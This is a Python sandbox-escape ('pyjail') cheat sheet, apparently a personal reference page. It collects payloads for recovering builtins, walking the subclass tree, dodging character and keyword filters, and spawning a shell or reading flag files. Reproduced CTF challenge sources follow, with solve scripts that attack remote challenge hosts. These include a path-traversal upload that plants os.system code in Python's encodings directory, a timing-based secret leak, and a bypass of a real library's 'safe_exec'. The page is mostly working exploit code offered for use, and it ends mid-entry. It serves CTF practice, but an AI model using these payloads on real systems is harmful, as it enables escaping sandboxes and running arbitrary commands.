---
title: 'Pyjail Cheat Sheet'
date: '2024-06-16'
category: 'cheatsheet'
description: ""
tags:
  - 'python3'
  - 'sandbox'
  - 'dunder methods'
---

> Notice: This document will be continuously updated.

## Sinks

### retrieving builtins
```py
# obtain builtins from a globally defined built-in functions
# https://docs.python.org/3/library/functions.html
print.__self__
__build_class__.__self__
__import__.__self__

# obtain builtins from site-module constants
# https://docs.python.org/3/library/constants.html#constants-added-by-the-site-module
help.__call__.__builtins__ # or __globals__
license.__repr__.__builtins__ # or __globals__

# obtain the builtins from a defined function
func.__globals__['__builtins__']
```

### good to know built-in functions and methods
```py
breakpoint() # pdb -> import os; os.system("sh")
exec(input()) # import os; os.system("sh")
eval(input()) # __import__("os").system("sh")

help() # less pager -> !/bin/sh
help() # less pager -> :e/flag.txt

assert len(set( [ *open("/flag.txt"), open("/flag.txt").read(), set(open("/flag.txt")).pop() ] )) == 1
# to stderr
int(*open("/flag.txt"))
float(*open("/flag.txt"))
complex(*open("/flag.txt"))
exit(set(open("/flag.txt")))
exit(*open("/flag.txt"))
open(*open("/flag.txt"))
compile(".","/flag.txt","exec")
raise Exception(*open("/flag.txt"))
# to stdout
help(*open("/flag.txt"))
print(*open("/flag.txt")
```

### subclasses
```py
# <class '_frozen_importlib.BuiltinImporter'>
().__class__.__mro__[1].__subclasses__()[104].load_module("os").system("sh");

# <class '_io._IOBase'> -> <class '_io._RawIOBase'> -> <class '_io.FileIO'>
().__class__.__mro__[1].__subclasses__()[111].__subclasses__()[0].__subclasses__()[0]("/flag.txt").read()

# <class 'os._wrap_close'>
().__class__.__mro__[1].__subclasses__()[137].__init__.__builtins__["__import__"]("os").system("sh")
().__class__.__mro__[1].__subclasses__()[137].__init__.__globals__["system"]("sh")

# <class 'subprocess.Popen'>
().__class__.__mro__[1].__subclasses__()[262](["cat","/flag.txt"], stdout=-1).communicate()[0]

# <class 'abc.ABC'> -> <class 'abc.ABCMeta'>
().__class__.__mro__[1].__subclasses__()[129].__class__.register.__builtins__["__import__"]("os").system("sh")

# <class 'generator'> - instance
(_ for _ in ()).gi_frame.f_globals["_""_loader_""_"].load_module("os").system("sh")
(_ for _ in ()).gi_frame.f_globals["_""_builtins_""_"].eval("_""_import_""_('os').system('sh')")

# <class 'async_generator'> - instance
(await _ for _ in ()).ag_frame.f_globals["_""_loader_""_"].load_module("os").system("sh")
(await _ for _ in ()).ag_frame.f_globals["_""_builtins_""_"].eval("_""_import_""_('os').system('sh')")
```

### popular modules
```py
# sys
sys.modules["module_name"] # contains most of the builtin modules (https://docs.python.org/3/library/index.html)
sys.breakpointhook() # same as breakpoint()
sys._getframe().f_globals["__builtins__"].__import__("os").system("sh")

# numpy
numpy.loadtxt("/flag.txt") # stderr

# pandas
TBA

# pickle
TBA
```

## Bypasses and payloads

### decorators
```py
@exec
@input
def a():pass # or class a:pass

@print
@set
@open
@input
class a:...

@print\\r@set\\r@open\\r@input\\rclass\\x0ca:pass
```

### unicode bypass
```py
# https://lingojam.com/ItalicTextGenerator

# no ASCII
𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵() # import os;os.system("/bin/sh")

# no ASCII letters, no double underscores, inside eval
_＿𝘪𝘮𝘱𝘰𝘳𝘵＿_(𝘪𝘯𝘱𝘶𝘵()).system(𝘪𝘯𝘱𝘶𝘵()) # double underscore bypass by having underscore + unicode underscore (https://www.compart.com/en/unicode/U+005F) -> U+FE33, U+FE34, U+FE4D, U+FE4E, U+FE4F, U+FF3F

# no ASCII letters, no double underscores, no builtins, inside eval
()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()[104].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦("\\157\\163").𝘴𝘺𝘴𝘵𝘦𝘮("\\57\\142\\151\\156\\57\\163\\150")

# no ASCII letters, no double underscores, no builtins, no quotes/double quotes inside eval (>= python3.8)
[𝘺:=()._＿𝘥𝘰𝘤＿_,𝘢:=y[19],()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()[104].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘺[34]+𝘢).𝘴𝘺𝘴𝘵𝘦𝘮(𝘢+𝘺[56])]

# no ASCII letters, no double underscores, no builtins, no quotes/double quotes, no square brackets inside eval (>= python3.8)
[𝘥:=()._＿𝘥𝘰𝘤＿_,d:=()._＿dir＿_().__class__(d),𝘴:=𝘥.pop(19),()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_().pop(104).𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘥.pop(33)+𝘴).𝘴𝘺𝘴𝘵𝘦𝘮(𝘴+𝘥.pop(54))]
```

### assigning fields and variables
```py
class cobj:...
```
```py
# eval
# walrus operator
[a:=().__doc__, print(a)]

# setattr
setattr(cobj, "field", "value"), print(cobj.field)
cobj.__setattr__("field", "value"), print(cobj.field)

# list comprehension
[cobj for cobj.field in ["value"]], print(cobj.field)
```

### deleting variables
```py
# eval
TBA

# exec
TBA
```

### getting attributes without dot
```py
# eval

# exec
# match
match ():
    case object(_＿doc＿_=a):
      pass
print(a) # ().__doc__
```

### getting attributes without underscore
```py
# try...except
try:
  "{0.__doc__.lol}".format(()) # format string can also be used to leak values
except Exception as e:
  a = e.obj
  print(a) # ().__doc__
```

### running functions and methods without parenthesis
```py
# TBA
```

## General stuff
### environment variables
- https://www.elttam.com/blog/env/#python
- `PYTHONINSPECT`, `PYTHONHOME`, `PYTHONPATH`, `PYTHONWARNINGS`, `BROWSER`

### magic methods
- https://rszalski.github.io/magicmethods/#appendix1

### stable payloads
```py
# @salvatore-abello - type.__subclasses__(type)[0] -> <class 'abc.ABCMeta'>
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]()
```

### finding sinks from modules
- https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code
- https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code

## CTF

### vsCTF 2024: llama-jail-revenge
- `chall.py`
```py
#!/usr/local/bin/python
from exec_utils import safe_exec
def my_safe_exec(__source):
    # even MORE safe, surely nothing you can do now!!!
    assert __source.isascii(), "ascii check failed"
    blacklist = ["match", "case", "async", "def", "class", "frame", "_", "byte", "coding"]
    for x in blacklist:
        assert x not in __source, f"{x} is banned"
    return safe_exec(__source)

if __name__ == "__main__":
    __source = ""
    print("Enter code: ")
    try:
        while (inp:=input()) != "#EOF":
            __source += inp + "\n"
    except EOFError:
        pass
    try:
        my_safe_exec(__source)
    except AssertionError as err:
        print(err)
```
- `exec_utils.py`
```py
# code from https://github.com/run-llama/llama_index/blob/35afb6b93476ef4f4d61a48d847cd0b191ac5cb6/llama-index-experimental/llama_index/experimental/exec_utils.py
# was main at the time of writing chall, however commit provided incase of changes
import ast
import copy
from types import CodeType, ModuleType
from typing import Any, Dict, Mapping, Sequence, Union

ALLOWED_IMPORTS = {
    "math",
    "time",
    "datetime",
    "pandas",
    "scipy",
    "numpy",
    "matplotlib",
    "plotly",
    "seaborn",
}

def _restricted_import(
    name: str,
    globals: Union[Mapping[str, object], None] = None,
    locals: Union[Mapping[str, object], None] = None,
    fromlist: Sequence[str] = (),
    level: int = 0,
) -> ModuleType:
    if name in ALLOWED_IMPORTS:
        return __import__(name, globals, locals, fromlist, level)
    raise ImportError(f"Import of module '{name}' is not allowed")

ALLOWED_BUILTINS = {
    "abs": abs,
    "all": all,
    "any": any,
    "ascii": ascii,
    "bin": bin,
    "bool": bool,
    "bytearray": bytearray,
    "bytes": bytes,
    "chr": chr,
    "complex": complex,
    "divmod": divmod,
    "enumerate": enumerate,
    "filter": filter,
    "float": float,
    "format": format,
    "frozenset": frozenset,
    "hash": hash,
    "hex": hex,
    "int": int,
    "isinstance": isinstance,
    "issubclass": issubclass,
    "len": len,
    "list": list,
    "map": map,
    "max": max,
    "min": min,
    "oct": oct,
    "ord": ord,
    "pow": pow,
    "print": print,
    "range": range,
    "repr": repr,
    "reversed": reversed,
    "round": round,
    "set": set,
    "slice": slice,
    "sorted": sorted,
    "str": str,
    "sum": sum,
    "tuple": tuple,
    "type": type,
    "zip": zip,
    # Constants
    "True": True,
    "False": False,
    "None": None,
    "__import__": _restricted_import,
}

def _get_restricted_globals(__globals: Union[dict, None]) -> Any:
    restricted_globals = copy.deepcopy(ALLOWED_BUILTINS)
    if __globals:
        restricted_globals.update(__globals)
    return restricted_globals

vulnerable_code_snippets = [
    "os.",
]

class DunderVisitor(ast.NodeVisitor):
    def __init__(self) -> None:
        self.has_access_to_private_entity = False
        self.has_access_to_disallowed_builtin = False

        builtins = globals()["__builtins__"].keys()
        self._builtins = builtins

    def visit_Name(self, node: ast.Name) -> None:
        if node.id.startswith("_"):
            self.has_access_to_private_entity = True
        if node.id not in ALLOWED_BUILTINS and node.id in self._builtins:
            self.has_access_to_disallowed_builtin = True
        self.generic_visit(node)

    def visit_Attribute(self, node: ast.Attribute) -> None:
        if node.attr.startswith("_"):
            self.has_access_to_private_entity = True
        if node.attr not in ALLOWED_BUILTINS and node.attr in self._builtins:
            self.has_access_to_disallowed_builtin = True
        self.generic_visit(node)

def _contains_protected_access(code: str) -> bool:
    # do not allow imports
    imports_modules = False
    tree = ast.parse(code)
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imports_modules = True
        elif isinstance(node, ast.ImportFrom):
            imports_modules = True
        else:
            continue

    dunder_visitor = DunderVisitor()
    dunder_visitor.visit(tree)

    for vulnerable_code_snippet in vulnerable_code_snippets:
        if vulnerable_code_snippet in code:
            dunder_visitor.has_access_to_disallowed_builtin = True

    return (
        dunder_visitor.has_access_to_private_entity
        or dunder_visitor.has_access_to_disallowed_builtin
        or imports_modules
    )

def _verify_source_safety(__source: Union[str, bytes, CodeType]) -> None:
    """
    Verify that the source is safe to execute. For now, this means that it
    does not contain any references to private or dunder methods.
    """
    if isinstance(__source, CodeType):
        raise RuntimeError("Direct execution of CodeType is forbidden!")
    if isinstance(__source, bytes):
        __source = __source.decode()
    if _contains_protected_access(__source):
        raise RuntimeError(
            "Execution of code containing references to private or dunder methods, "
            "disallowed builtins, or any imports, is forbidden!"
        )

def safe_eval(
    __source: Union[str, bytes, CodeType],
    __globals: Union[Dict[str, Any], None] = None,
    __locals: Union[Mapping[str, object], None] = None,
) -> Any:
    """
    eval within safe global context.
    """
    _verify_source_safety(__source)
    return eval(__source, _get_restricted_globals(__globals), __locals)

def safe_exec(
    __source: Union[str, bytes, CodeType],
    __globals: Union[Dict[str, Any], None] = None,
    __locals: Union[Mapping[str, object], None] = None,
) -> None:
    """
    eval within safe global context.
    """
    _verify_source_safety(__source)
    return exec(__source, _get_restricted_globals(__globals), __locals)
```

- `solve.py`
```py
# Using "with"-statement context managers to expose/retrieve Exception classes
# https://rszalski.github.io/magicmethods/#context
ss = []
obj = type(type).mro(type)[-1]
cus = type("a", (obj,), {"\\137\\137exit\\137\\137": lambda s,e,v,t: [ss.append(e)], "\\137\\137enter\\137\\137": lambda s: s})
f = lambda: None
with cus():
    obj.lol
print(ss)
ex = ss[0]

try:
    "{0.\\137\\137globals\\137\\137[\\137\\137builtins\\137\\137][\\137\\137import\\137\\137].lol}".format(f)
except ex as e:
    try:
        "{0.popen.lol}".format(e.obj("os"))
    except ex as e:
        print(e.obj("cat /flag*").read())
#EOF
```

### GlacierCTF 2023: Avatar
- `server.py`
```py
print("You get one chance to awaken from the ice prison.")
code = input("input: ").strip()
whitelist = """gctf{"*+*(=>:/)*+*"}""" # not the flag
if any([x not in whitelist for x in code]) or len(code) > 40000:

    print("Denied!")
    exit(0)

eval(eval(code, {'globals': {}, '__builtins__': {}}, {}), {'globals': {}, '__builtins__': {}}, {})
```
- `solve.py`
```py
m = b"""[a for a in ().__class__.__base__.__subclasses__() if 'wrapper' not in f'{a.__init__}'][0].__init__.__builtins__['__import__']('os').system('sh')"""
print(m)
m = [int(x) for x in m]
m = m[3:]

mapping = {
    1: "g",
    2: "t",
    32: "f",
    91: "c",
    ord('a'): "c+t+t+t",
    ord('f'): "c+t+t+t+t+t+g",
    ord('o'): "c+t+t+t+t+t+t+t+t+t+t",
    ord('r'): "c+t+t+t+t+t+t+t+t+t+t+t+g",
    ord('i'): "c+t+t+t+t+t+t+t",
    ord('n'): "c+t+t+t+t+t+t+t+t+t+g",
    ord('('): "f+t*t*t",
    ord(')'): "f+t*t*t+g",
    ord('.'): "f+t*t*t+t+t+t",
    ord('_'): "c+t+g+g",
    ord('c'): "c+t+t+t+t",
    ord('l'): "c+t+t+t+t+t+t+t+t+g",
    ord('s'): "c+t*t*t*t+t+t+t+t",
    ord('b'): "c+t+t+t+g",
    ord('e'): "c+t+t+t+t+t",
    ord('u'): "c+t*t*t*t+t+t+t+t+t",
    ord("'"): "f+t+t+t+g",
    ord('w'): "c+t*t*t*t+t+t+t+t+t+t",
    ord('p'): "c+t+t+t+t+t+t+t+t+t+t+g",
    ord('t'): "c+t*t*t*t+t+t+t+t+g",
    ord('['): "c",
    ord(']'): "c+t",
    ord('0'): "f+t+t+t+t+t+t+t+t",
    ord('m'): "c+t+t+t+t+t+t+t+t+t",
    ord('y'): "c+t*t*t*t+t+t+t+t+t+t+t",
    ord('h'): "c+t+t+t+t+t+t+g",
}

payload = 'f"{(f:=(t:=(g:=+(()==()))+g)*t*t*t*t+g+g)+t*t*(t+g):c}{(c:=(f*t+t*t*t*t+t*t*t+t+g)):c}{c:c}{c+t+t:c}'
payload = 'f"{(c:=(f:=(t:=(g:=+(()==()))+g)*t*t*t*t)*t+t*t*t*t+t*t*t+t+g):c}{c+t+t+t:c}{f:c}'

whitelist = """gctf{"*+*(=>:/)*+*"}"""
# generate payload
for c in m:
    if chr(c) in whitelist:
        if chr(c) == "{" or chr(c) == "}":
            payload += chr(c)*2
        else:
            payload += chr(c)
    elif c not in mapping:
        payload += "{c:c}"
    else:
        payload += "{%s:c}" % mapping[c]
payload += '"'
print(len(payload))
print(payload)
print(eval(payload)) # verify payload is the same
```

### TFC CTF 2023: My Third Calculator
- `server.py`
```py
import sys
print("This is a safe calculator")
inp = input("Formula: ")
sys.stdin.close()

blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ."
if any(x in inp for x in blacklist):
    print("Nice try")
    exit()

fns = {
    "__builtins__": {"setattr": setattr, "__import__": __import__, "chr": chr}
}
print(eval(inp, fns, fns))
```
- `solve.py`
```py
# TBA
```

### Equinor CTF 2023: Dis is it!
- `main.py`
```py
from flask import Flask, request, redirect, send_from_directory
import dis
import io
import contextlib
import os
import datetime
app = Flask(__name__)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/report/<path:filename>')
def serve_reports(filename):
    res = send_from_directory('./reports/', filename)
    del res.headers['Content-Disposition']
    res.headers['Content-Type'] = 'text/plain'
    return res

@app.route('/api/disassemble', methods=['POST'])
def disassemble():
    report_name = request.files['source'].filename
    source = request.files['source'].stream.read()
    if os.path.exists('./reports/' + report_name):
        return redirect('/report/' + report_name)
    report = io.StringIO()
    with contextlib.redirect_stdout(report):
        print('-')
        print('Report for', report_name)
        print('Report date:', datetime.datetime.now())
        print('-')
        try:
            code = compile(source, '<string>', 'exec')
            dis.dis(code)
        except SyntaxError as e:
            print('Error:', e)
        print('-')
        print('Source code:')
        print('-')
    with open('./reports/' + report_name, 'w') as file:
        width = max(60, max(len(line) for line in report.getvalue().split('\n')))
        for line in report.getvalue().strip().split('\n'):
            line = line.ljust(width) if line != '-' else '-' * width
            file.write('# ' + line + ' #\n')
        file.write(source.decode())
    return redirect('/report/' + report_name)

if __name__ == '__main__':
    app.run('0.0.0.0', 1337)
```
- `solve.py`
```py
# @null
import requests
# target = 'http://localhost:1337/'
target = 'http://io.ept.gg:42256/'

payload = b'''import os
os.system('cp /flag*.txt /app/reports/flag.txt')'''

# Upload payload to /usr/local/lib/python3.12/encodings/fefe.py
files = {'source': ('../../usr/local/lib/python3.12/encodings/fefe.py', payload.decode())}
requests.post(target + '/api/disassemble', files=files, allow_redirects=False)

# When running or compiling python files that use the fefe encoding will now trigger our payload
files = {'source': ('fefe.py', b'# encoding: fefe')}
requests.post(target + '/api/disassemble', files=files, allow_redirects=False) # trigger payload
# Read flag
print(requests.get(target + '/report/flag.txt').text)
```

### 37C3 Potluck CTF: tacocat
- `main.py`
```py
while True:#
    x = input("palindrome? ")#
    assert "#" not in x, "comments are bad"#
    assert all(ord(i) < 128 for i in x), "ascii only kthx"#
    print(x, x[::-1])
    assert x == x[::-1], "not a palindrome"#
    assert len(x) < 36, "palindromes can't be more than 35 characters long, this is a well known fact."#
    #assert sum(x.encode()) % 256 == 69, "not nice!"#
    eval(x)#)x(lave
#"!ecin ton" ,96 == 652 % ))(edocne.x(mus tressa
#".tcaf nwonk llew a si siht ,gnol sretcarahc 53 naht erom eb t'nac semordnilap" ,63 < )x(nel tressa
#"emordnilap a ton" ,]1-::[x == x tressa
#"xhtk ylno iicsa" ,)x ni i rof 821 < )i(dro(lla tressa
#"dab era stnemmoc" ,x ni ton "#" tressa
#)" ?emordnilap"(tupni = x
#:eurT elihw
```
- `solve.py`
```py
# setting up template for generating palindromes
alph = "abcdefghijklmnopqrstvwyzABCDEFGHIJKLMNOPQRSTVWYZ1234567890!\\"#¤%&/()=?@$€{[]}"
dd = r"""'START\\',)"CHAR"=:VAR1(,',(VAR1:="CHAR"),'\\START'"""
ff = r"""'START\\',)"CHAR"+VAR2=:VAR1(,',(VAR1:=VAR2+"CHAR"),'\\START'"""
gg = r"""'START\\',))VAR1(lave(,',(eval(VAR1)),'\\START'"""
ch = [dd,ff,gg]

payload = """eval(input());"""
out = []

var = var2 = "C"
for i,char in enumerate(payload):
    found = False
    # some dumb manual fixes
    if i == 7:
        var = "a"
        var2 = "C"
    if i == 8:
        var = "C"
        var2 = "a"
    if i == 9:
        var = "b"
        var2 = "C"
    if i == 10:
        var = "b"
        var2 = "b"
    # brute char
    for brute in alph:
        n = ch[1 if i>0 and i!=len(payload)-1 else 0 if i == 0 else 2].replace("START",brute)
        if char == "\\"":
            char = "\\\\"+char
        n = n.replace("CHAR",char)
        n = n.replace("VAR1", var)
        n = n.replace("VAR2", var2)
        check = sum(n.encode()) % 256
        if check == 69 and n == n[::1]:
            out.append(n)
            print(out)
            found = True
            break
    if not found:
        print("COULDNT FIND VALID CHAR", i, payload[i])
        break

# verify payload works
print()
for p in out[:-1]:
    print(p)
    eval(p)
payload = eval(var)
print(f"{payload=}")
"""
'Y\\',)"e"=:C(,',(C:="e"),'\\Y'
'Z\\',)"v"+C=:C(,',(C:=C+"v"),'\\Z'
'o\\',)"a"+C=:C(,',(C:=C+"a"),'\\o'
'd\\',)"l"+C=:C(,',(C:=C+"l"),'\\d'
'(\\',)"("+C=:C(,',(C:=C+"("),'\\('
'g\\',)"i"+C=:C(,',(C:=C+"i"),'\\g'
'b\\',)"n"+C=:C(,',(C:=C+"n"),'\\b'
'B\\',)"p"+C=:a(,',(a:=C+"p"),'\\B'
'=\\',)"u"+a=:C(,',(C:=a+"u"),'\\='
'=\\',)"t"+C=:b(,',(b:=C+"t"),'\\='
'j\\',)"("+b=:b(,',(b:=b+"("),'\\j'
'i\\',)")"+b=:b(,',(b:=b+")"),'\\i'
'i\\',)")"+b=:b(,',(b:=b+")"),'\\i'
'a\\',))b(lave(,',(eval(b)),'\\a'
"""

from pwn import *
sh = remote('challenge28.play.potluckctf.com',31337)
for p in out:
    sh.sendlineafter('palindrome?', p.encode())
sh.sendline("__import__('os').system('sh')")
sh.interactive()
```

### Internet Festival 2023 CTF Finals: prison
- `prison.py`
```py
#!/usr/bin/env python3

def main():
        locals = {'__builtins__': {'__build_class__': __build_class__, "print": print}}

        blacklist = [
                '\'', '""', '((', '[[', '{', '==',
                '0', '11', '2', '3', '4', '5', '6', '7', '8', '9',
                'True', 'False', 'None', '...',
                '+', '-', '**', '/', '%', '<', '>', '&', '|', '^', '~',
        ]

        code = input()
        if not code.isascii() or any(word in code for word in blacklist):
                print("Blacklisted word detected, exiting ...")
                exit(1)

        exec(code, locals)

if __name__ == '__main__':
        main()
```
- `solve.py`
```py
from pwn import *
io = remote("challs.ifctf.fibonhack.it", 10010)
payload = """
for __name__ in __build_class__.__class__.__dir__.__qualname__:
    @__build_class__.__self__.exec
    @__build_class__.__self__.input
    class x:pass
"""
payload = payload.replace("\n","\r")
io.sendline(payload)
io.sendline("__build_class__.__self__.print(__build_class__.__self__.open('./flag.txt').read())")
io.interactive()
```

### WACON 2023 Prequal: ScavengerHunt
- `prob.py`
```py
#!/usr/bin/env python3
import secret
import pyseccomp
import sys

print("Find the treasure!")
data = input()

f = pyseccomp.SyscallFilter(defaction=pyseccomp.KILL)
f.add_rule(pyseccomp.ALLOW, 'rt_sigaction')
f.add_rule(pyseccomp.ALLOW, 'munmap')
f.add_rule(pyseccomp.ALLOW, 'exit_group')
f.add_rule(pyseccomp.ALLOW, 'exit')
f.add_rule(pyseccomp.ALLOW, 'brk')
f.load()
del pyseccomp
del f
del sys

__builtins__ = {}
try:
    eval(data, {'__builtins__': {}}, {'__builtins__': {}})
except:
    pass
exit(0)
```
- `secret.py`
```py
__builtins__ = {}

some_unknown_and_very_long_identifier_name = "WACON2023{[REDACTED]}"
```
- `solve.py`
```py
from pwn import *
import time
context.log_level = "critical"

# Find the offset for os._wrap_close on server (140)
alph = b"{}0123456789abcdef"
flag = "WACON2023{"
# flag = "WACON2023{91d9cec468a8b22b57c2b091beb64bcc}"
index = len(flag)
while "}" not in flag:
    for guess in alph:
        # sh = remote("1.234.10.246", 55555)
        sh = process(["python3", "og.py"])
        payload = f'''[a:=[].__class__.__base__.__subclasses__()[140].__init__.__builtins__,b:=a["__import__"],c:=b("secret").__dir__()[-1],d:=b("secret").__getattribute__(c),a["exec"]("while True:\\n\\tpass") if (a["ord"](d[{index}]))=={guess} else 1]'''
        print(payload)
        sh.recv()
        sh.sendline(payload)
        start = time.time()
        try:
            sh.recv(timeout=1)
        except:
            end = time.time()
            if int(end-start) >= 1:
                index += 1
                flag += chr(guess)
                print(end-start, flag)
                sh.close()
                break
            sh.close()
            continue
        end = time.time()
        if int(end-start) >= 1:
            index += 1
            flag += chr(guess)
            print(end-start, flag)
            sh.close()
            break
print(flag)
# [a:=[].__class__.__base__.__subclasses__()[140].__init__.__builtins__,a["exec"]("while True:\n\tpass") if True else 1]
```

### CrewCTF 2023: starship-1
- `sandbox.py`
```py
#!/usr/bin/env python3
import re
import sys

class Nobuffers:
    def __init__(self, stream):
        self.stream = stream

    def write(self, data):
        self.stream.write(data)
        self.stream.flush()

    def writelines(self, datas):
        self.stream.writelines([f"{data}\n" for data in datas])
        self.stream.flush()

    def __getattr__(self, attr):
        return getattr(self.stream, attr)

banned = re.escape('\\(~}?>{&/%`)<$|*=#!-+\'0123456789;[] ')
stdout = Nobuffers(sys.stdout)
stdout.write('''

        __..,,-----l"|-.
    __/"__  |----""  |  i--voo..,,__
 .-'=|:|/\|-------o.,,,---. Y88888888o,,_
_+=:_|_|__|_|   ___|__|___-|  """"`"""`----------.........___
__============:' "" |==|__\===========(=>=+    |           ,_, .-"`--..._
  ;="|"|  |"| `.____|__|__/===========(=>=+----+===-|---------<---------_=-
 | ==|:|\/| |   | o|.-'__,-|   .'  _______|o  `----'|        __\ __,.-'"
  "`--""`--"'"""`.-+------'" .'  _L___,,...-----------"""""""   "
                  `------""""""""

''')

stdout.write('Enter command: ')
prompt = input()

if prompt.isascii() and not re.findall(f'[{banned}]', prompt):
    try:
        exec(prompt, {'__builtins__': {'__build_class__': __build_class__, "__name__":__name__}})
    except:
        pass
```
- `solve.py`
```py
# @quasar - eval("__import__('os').system('sh')")
a = """@__build_class__.__self__.eval
@__build_class__.__self__.bytes
@__build_class__.__self__.copyright._Printer__filenames.__add__
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@__build_class__.__self__.chr
@__build_class__.__self__.len
@__build_class__.__self__.StopAsyncIteration.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"sh".format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EncodingWarning.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@".system".format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@__build_class__.__self__.chr
@__build_class__.__self__.len
@__build_class__.__self__.StopAsyncIteration.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"os".format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EncodingWarning.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"__build_class__.__self__.__import__".format
class\x0ca:...""".replace("\n", "\r")

# @st4rn
from pwn import *
p = remote("starship-1.chal.crewc.tf", 40003)
p.sendline('@__build_class__.__self__.exec\r@__build_class__.__self__.input\rclass\x0cx:pass')
p.sendline('__build_class__.__self__.__import__("os").system("sh")')
p.interactive()
```

### CrewCTF 2023: starship
- `solve.py`
```py
# @quasar - setting sys.stdout.flush to breakpoint
[id for sys.stdout.flush in [id.__self__.__dict__[mA] for aA,bA,cA,dA,eA,fA,gA,hA,iA,jA,kA,lA,mA,nA,oA,pA,qA,rA,sA,tA,uA,vA,wA,xA,yA,zA,aB,bB,cB,dB,eB,fB,gB,hB,iB,jB,kB,lB,mB,nB,oB,pB,qB,rB,sB,tB,uB,vB,wB,xB,yB,zB,aC,bC,cC,dC,eC,fC,gC,hC,iC,jC,kC,lC,mC,nC,oC,pC,qC,rC,sC,tC,uC,vC,wC,xC,yC,zC,aD,bD,cD,dD,eD,fD,gD,hD,iD,jD,kD,lD,mD,nD,oD,pD,qD,rD,sD,tD,uD,vD,wD,xD,yD,zD,aE,bE,cE,dE,eE,fE,gE,hE,iE,jE,kE,lE,mE,nE,oE,pE,qE,rE,sE,tE,uE,vE,wE,xE,yE,zE,aF,bF,cF,dF,eF,fF,gF,hF,iF,jF,kF,lF,mF,nF,oF,pF,qF,rF,sF,tF,uF,vF,wF,xF,yF,zF,aG in [id.__self__.__dict__]]]

# @st4rn - os.system("sh")
[[re.A[i] for re.RegexFlag.__getitem__ in [[[re.A[i] for re.RegexFlag.__getitem__ in [sys.modules.get]] for i in [[[re.A[i] for re.RegexFlag.__getitem__ in [str]] for i in [re.A[[i for i in [re.X.value^re.U.value^re.M.value^re.L.value^re.I.value^re.T.value, re.X.value^re.U.value^re.S.value^re.I.value^re.T.value]]] for re.RegexFlag.__getitem__ in [bytearray]]][re.A.value^re.A.value][re.A.value^re.A.value][re.M.value^re.L.value:re.I.value^re.L.value^re.M.value]]][re.A.value^re.A.value][re.A.value^re.A.value].system]] for i in [[[re.A[i] for re.RegexFlag.__getitem__ in [str]] for i in [re.A[[i for i in [re.X.value^re.U.value^re.S.value^re.I.value^re.T.value, re.X.value^re.U.value^re.M.value]]] for re.RegexFlag.__getitem__ in [bytearray]]][re.A.value^re.A.value][re.A.value^re.A.value][re.M.value^re.L.value:re.I.value^re.L.value^re.M.value]]]
```

### CrewCTF 2023: setjail
- `solve.py`
```py
# @Satoooon - https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code
import: ctypes._aix
path: .__loader__.exec_module.__globals__["sys"].modules["ctypes._aix"].environ["PYTHONINSPECT"]
value: "1"

# @maple3142
import: main
import: os
path: .__builtins__["help"].__repr__.__globals__["sys"].modules["__main__"].DISALLOWED_WORDS
value: []
path: .__builtins__["help"].__repr__.__globals__["sys"].modules["os"].environ["PYTHONINSPECT"]
value: "1"
```

### BYUCTF 2023: Builtins 1
- `b1.py`
```py
print(eval(input("code> "), {"__builtins__": {}}, {"__builtins__": {}}))
```
- `solve.py`
```py
# TBA
```

### BYUCTF 2023: Builtins 2
- `b2.py`
```py
inp = input("code> ")[:72]
if "__" in inp:
    print("Nope")
else:
    print(eval(inp, {"__builtins__": {}}, {"__builtins__": {}}))
```
- `solve.py`
```py
# TBA
```

### BYUCTF 2023: a-z0-9
- `a-z0-9.py`
```py
eval((__import__("re").sub(r'[a-z0-9]','',input("code > ").lower()))[:130])
```
- `solve.py`
```py
# TBA
```

### BYUCTF 2023: Leet 1
- `leet1.py`
```py
import re
FLAG = open('flag.txt').read()
inp = input('> ')
if re.search(r'\d', inp) or eval(inp) != 1337:
    print('Nope')
else:
    print(FLAG)
```
- `solve.py`
```py
# TBA
```

### BYUCTF 2023: Leet 2
- `leet2.py`
```py
import re
